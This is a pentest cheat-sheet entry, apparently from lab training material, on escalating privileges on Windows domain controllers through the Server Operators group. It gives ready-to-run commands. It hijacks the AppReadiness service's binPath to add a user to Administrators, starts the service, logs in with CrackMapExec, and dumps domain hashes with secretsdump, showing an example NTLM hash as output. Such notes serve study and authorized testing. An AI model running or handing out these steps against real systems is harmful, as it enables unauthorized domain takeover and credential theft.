### Technique Name:

Server Operators
### Summary:

Members of the `Server Operators` group have elevated rights on domain systems, including the ability to log on locally to Domain Controllers, manage services, and leverage `SeBackupPrivilege` and `SeRestorePrivilege`. This privilege set enables indirect privilege escalation paths. One method involves modifying the binary path of a trusted service (like AppReadiness) to execute arbitrary commands with SYSTEM privileges.
### Conditions:

- Membership in the `Server Operators` group    
- Ability to modify and start services (e.g., AppReadiness)
- Target service runs as `LocalSystem`
- Local user on a Domain Controller or high-value server
### Enumeration:

```cmd
# Confirm privileges
whoami /priv

# Identify accessible services and their permissions
sc qc AppReadiness
c:\Tools\PsService.exe security AppReadiness

# Confirm lack of admin privileges
net localgroup Administrators
```

### Exploitation:

#### 1. Modify Service Binary to Add User to Administrators

```cmd
sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
```

#### 2. Start the Service to Trigger the Command

```cmd
sc start AppReadiness
```

> Although the service fails to start (Error 1053), the command inside `binPath` gets executed successfully.

#### 3. Confirm Exploit Success

```cmd
net localgroup Administrators
```

Expected Output:

```
Administrator
Domain Admins
Enterprise Admins
server_adm
```

### Post-Exploitation:

- Use new admin rights to dump credentials, access NTDS.dit, or lateral movement
- Example using CrackMapExec:

```bash
crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'
```

- Dump domain hashes:    

```bash
secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator
```

Expected Output:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
```

- Clean up by reverting the `binPath` or restoring the original configuration (optional but recommended during authorized assessments)
# Tags
> #Windows-Post-Exploitation #Windows-Privesc #Privileged_Groups 